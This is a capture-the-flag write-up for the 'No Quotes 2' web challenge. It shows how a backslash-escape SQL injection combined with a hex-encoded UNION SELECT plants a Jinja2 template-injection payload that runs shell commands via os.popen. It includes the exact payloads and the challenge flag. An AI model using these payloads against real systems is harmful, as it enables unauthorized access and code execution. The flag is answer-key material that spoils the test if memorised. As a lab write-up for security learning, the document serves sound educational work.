---
title: No Quotes 2
tags:
  - SQLi
  - MySQL
  - SSTI
  - Flask
  - Jinja2
  - offline-solvable
category: Web
---

# Description

Unless it's from "Go Go Squid!", no quotes are allowed here! Let this wholesome quote heal your soul:

Ai Qing: "If you didn't know about robot combat back then, what would you be doing?"

Wu Bai: "There's no if. As long as you're here, I'll be here."

File Provided: [no-quotes.zip](https://github.com/gmanctf/2026-UofTCTF/blob/main/Web/No%20Quotes%202/no-quotes-2.zip)

# Solution

Checking the source code for `app.py` quickly reveals two key vulnerabilities. The first one is a SQL injection:

```python
query = (
    "SELECT id, username FROM users "
    f"WHERE username = ('{username}') AND password = ('{password}')"
)
```

The second vulnerability is a SSTI:

```python
return render_template_string(open("templates/home.html").read() % session["user"])
```

The template uses the username as input, which we can control as part of the login process. The last thing to consider, is that there's a filter that will prevent us from using the characters `'` and `"`:

```python
def waf(value: str) -> bool:
    blacklist = ["'", '"']
    return any(char in value for char in blacklist)
```

With all this in consideration, what we need to achieve is a SQL injection that does not use `'` and `"` and that uses a SSTI payload as the username.

This is the SQL query for the login:

```sql
SELECT id, username FROM users WHERE username = ('<user input>') AND password = ('<user input>')
```

We can do the following to bypass authentication and confirm the SQL injection:

```
username: \
password: )+OR+1=1#
```

The above works because the SQL query becomes:

```sql
SELECT id, username FROM users WHERE username = ('\') AND password = (')+OR+1=1#')
```

Notice how the username in the query becomes `('\') AND password = (')` while the remaining SQL query becomes `OR 1=1`. This makes the condition true and you can log in as the first username in the database, in this case, the user test. This however, is not enough to get the flag. We need to exploit the SSTI vulnerability. The following is a simple payload that would work to execute the `id` command:

```js
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Because of the filter, we cannot use `'`. We can convert the payload to hex:

```
0x7b7b726571756573742e6170706c69636174696f6e2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f28276f7327292e706f70656e2827696427292e7265616428297d7d
```

Then we can use the following as the password:

```sql
) UNION SELECT 1,0x7b7b726571756573742e6170706c69636174696f6e2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f28276f7327292e706f70656e2827696427292e7265616428297d7d#
```

If we use `test\` as username, the query would become:

```sql
SELECT id, username FROM users WHERE username = ('test\') AND password = (') UNION SELECT 1,0x7b7b726571756573742e6170706c69636174696f6e2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f28276f7327292e706f70656e2827696427292e7265616428297d7d#')
```

Let's test it:

![[2026-UofTCTF-No-Quotes.png|400]]

Great! now we just need to execute `/readflag` instead:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('/readflag').read()}}

# in hex:
7b7b726571756573742e6170706c69636174696f6e2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f28276f7327292e706f70656e28272f72656164666c616727292e7265616428297d7d
```

Final request:

```
username: test\
password: ) UNION SELECT 1,0x7b7b726571756573742e6170706c69636174696f6e2e5f5f676c6f62616c735f5f2e5f5f6275696c74696e735f5f2e5f5f696d706f72745f5f28276f7327292e706f70656e28272f72656164666c616727292e7265616428297d7d#
```

Flag: ==uoftctf{w0w_y0u_5UcC355FU1Ly_Esc4p3d_7h3_57R1nG!}==
